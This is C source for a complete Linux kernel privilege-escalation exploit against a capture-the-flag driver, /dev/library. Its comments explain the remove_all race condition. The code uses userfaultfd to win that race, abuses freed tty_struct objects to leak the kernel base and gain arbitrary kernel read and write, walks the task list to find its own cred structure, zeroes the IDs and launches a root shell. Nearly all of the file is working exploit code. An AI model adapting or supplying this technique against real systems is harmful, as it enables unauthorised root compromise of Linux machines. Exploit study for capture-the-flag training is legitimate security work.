#define _GNU_SOURCE
#include <stdio.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/timerfd.h>
#include <string.h>
#include <stdlib.h>
#include <poll.h>
#include <pthread.h>
#include <assert.h>
#include <sys/mman.h>
#include <stdint.h>
#include <linux/userfaultfd.h>

#define DEVICE_NAME "/dev/library"

#define CMD_ADD         0x3000
#define CMD_REMOVE      0x3001
#define CMD_REMOVE_ALL  0x3002
#define CMD_ADD_DESC    0x3003
#define CMD_GET_DESC    0x3004

// For this challenge we're dealing with kmalloc-0x400.
// as the book size is 0x318 and 0x318 is within 0x201 and 0x400.
// tty_struct is a good target in case of UAF or double free.
// the vulnerability was a race condition that can be triggered like this : 
//
// Alloc_book -> remove_all (it is not locked correctly) -> read_description() for the leaks
// Alloc_book -> remove_all (again not locked correctly) -> add_description() for rip control.
//
// I allowed userfault_fd syscall so that races become more reliable.
// But SMAP is enabled which means we can't pivot our stack to userspace that easily.
// The intended solution was to overwrite two tty_struct one to achieve arbitrary read
// and the other to achieve arbitrary write, (by overwriting tty_operations element of tty_struct)
// start at init_task compare its PID with your exploit PID, if they don't match go to the next
// field of the doubly-linked list.
// When the correct task_struct is found, you can then patch the cred struct and make *ID to 0x0.
// 

int fd;
pthread_t tid;

int ptmx_read;
int ptmx_write;

unsigned long* leaks;

void open_file() {
	fd = open("/dev/library", O_RDWR);
}

struct Request {
    unsigned long index;
    char* userland_pointer;
};

void add_book(unsigned long index) {
	struct Request r;
	r.index = index;
	int ret = ioctl(fd, CMD_ADD, &r);
	printf("add_book ret %d\n", ret);
}

void remove_book(unsigned long index) {
	struct Request r;
	r.index = index;
	int ret = ioctl(fd, CMD_REMOVE, &r);
	printf("remove_book ret %d\n", ret);
}

void remove_all() {
	struct Request r;
	int ret = ioctl(fd, CMD_REMOVE_ALL, &r);
	printf("remove_all ret %d\n", ret);
}

void add_desc(unsigned long index, char* ptr) {
	struct Request r = {
		.index = index,
		.userland_pointer = ptr,
	};
	int ret = ioctl(fd, CMD_ADD_DESC, &r);
	printf("add_desc ret %d\n", ret);

}

void get_desc(unsigned long index, char* ptr) {
	struct Request r = {
		.index = index,
		.userland_pointer = ptr,
	};
	int ret = ioctl(fd, CMD_GET_DESC, &r);
	printf("get_desc ret %d\n", ret);
}

unsigned int events_number = 0;
unsigned long* p;
unsigned long kernel_base = 0;

void fault_handler(uint64_t* arg){
	static struct uffd_msg uffd_msg;
	long uffd = (long)arg;

	for(;;){
		struct pollfd pollfd = {
			.fd = uffd,
			.events = POLLIN
		};

		poll(&pollfd, 1, -1);
		read(uffd, &uffd_msg, sizeof(uffd_msg));
		if(uffd_msg.event & UFFD_EVENT_PAGEFAULT){

			/// Here goes the implementation when the pagefault triggers.
			if(events_number == 0) {
				puts("Event 0 --- leaks ---");
				remove_all();
				open("/dev/ptmx", O_RDWR | O_NOCTTY);
			}

			else if(events_number == 1) {
				puts("Event 1 --- Arb read ---");
				remove_all();

				ptmx_read = open("/dev/ptmx", O_RDWR | O_NOCTTY);

				p = (unsigned long*)malloc(0x4000);
				unsigned long tty_struct = (leaks[7] & ~0xff) + 0x800;

				p[0] = 0x0000000100005401;
				p[2] = leaks[7];
				p[3] = tty_struct+0x2f0-0x60;
				
				// for arb read
				p[0x2f0/8] = kernel_base + 0x17538d; //0xffffffff8117538d;

				// for arb write too
				p[0x2f8/8] = kernel_base + 0x13e9b1;

				struct uffdio_copy uffdio_copy;
				uffdio_copy.src = p;
				uffdio_copy.dst = (unsigned long)uffd_msg.arg.pagefault.address;
				uffdio_copy.len = 0x4000;
				assert(ioctl(uffd, UFFDIO_COPY, &uffdio_copy) != -1);

			}
			
			else if(events_number == 2) {
				puts("Event 2 --- Arb write ---");
				remove_all();
				ptmx_write = open("/dev/ptmx", O_RDWR | O_NOCTTY);
				unsigned long tty_struct = (leaks[7] & ~0xff) + 0x800;

				p[3] = tty_struct+0x2f8-0x60;

				struct uffdio_copy uffdio_copy;
				uffdio_copy.src = p;
				uffdio_copy.dst = (unsigned long)uffd_msg.arg.pagefault.address;
				uffdio_copy.len = 0x4000;
				assert(ioctl(uffd, UFFDIO_COPY, &uffdio_copy) != -1);
			}

			events_number++;
			/// end of implementation.

			struct uffdio_register uffdio_register;
			uffdio_register.range.start = uffd_msg.arg.pagefault.address;
			uffdio_register.range.len = 0x4000;
			uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;

			ioctl(uffd, UFFDIO_UNREGISTER, &uffdio_register.range);
			return;
		}
	}

	return;
}


char * userfaultfd_chunk(void){
	
	struct uffdio_api uffdio_api;
	struct uffdio_register uffdio_register;
	int p;

	uint64_t uffd = syscall(__NR_userfaultfd, O_CLOEXEC|O_NONBLOCK);
	assert(uffd > 2);
	
	char* mmaped_ptr = (char *)mmap(NULL,
			0x4000,
			PROT_READ|PROT_WRITE,
			MAP_PRIVATE|MAP_ANONYMOUS,
			-1,
			0
			);
	uffdio_api.api = UFFD_API;
	uffdio_api.features = 0;

	assert(ioctl(uffd, UFFDIO_API, &uffdio_api) != -1);

	uffdio_register.range.start = (unsigned long)mmaped_ptr;
	uffdio_register.range.len   = 0x4000;
	uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
	assert(ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) != -1);
	
	p = pthread_create(&tid, NULL, (void*)fault_handler, (void *)uffd);
	return mmaped_ptr;
}

void show_leaks(void* p) {
	unsigned long* ul_p = (unsigned long*)p;

	for(int i=0; i<(0x300 >> 3); i++) {
		printf("QW %d \t\t %p\n", i, ul_p[i]);
	}
}


unsigned long arb_read(unsigned long address) {
	unsigned long lower_half = ioctl(ptmx_read, 0, address);
	unsigned long higher_half = ioctl(ptmx_read, 0, address+0x4);
	return (higher_half << 32) | lower_half;
}

void arb_write(unsigned long where, unsigned long what) {
	ioctl(ptmx_write, (what & 0xffffffff), where);
	ioctl(ptmx_write, (what >> 32), where+0x4);
}

void escalate() {
	
	unsigned long init_task = kernel_base + 0x8224c0;
	unsigned long pid_offset = 0x278;
	unsigned long next = 0x1d0;
	unsigned long pid = getpid();
	unsigned long init_task_pid;
	unsigned long list_head;

	printf("current pid %ld\n", pid);

	while(1) {
		init_task_pid = arb_read(init_task + pid_offset) & 0xffffffff;
		list_head = arb_read(init_task + next);

		if(init_task_pid == pid)	
				break;
		init_task = arb_read(list_head) - next;
		printf("PID: %ld task_struct :%p.\n", init_task_pid, init_task);
	}

	unsigned long cred = arb_read(init_task + 0x3c0);
	printf("cred struct : %p\n", cred);
	arb_write(cred+4,     0);
	arb_write(cred+4+8,   0);
	arb_write(cred+4+8*2, 0);
	arb_write(cred+4+8*3, 0);
}

void shell() {
	char *argv[] = {"/bin/sh", NULL};
	execve(argv[0], argv, NULL);
}

int main() {
	open_file();
	add_book(0);
	leaks = userfaultfd_chunk();
	get_desc(0, leaks);
	
	// setup kernel base.
	kernel_base = leaks[66] - 0x14fc00;
	printf("kernel base @ %p\n", kernel_base);
	
	
	// arb read setup.
	add_book(0);
	add_desc(0, userfaultfd_chunk());
	
	// arb write setup.
	add_book(0);
	add_desc(0, userfaultfd_chunk());
	pthread_join(tid, NULL);

	escalate();

	shell();
}

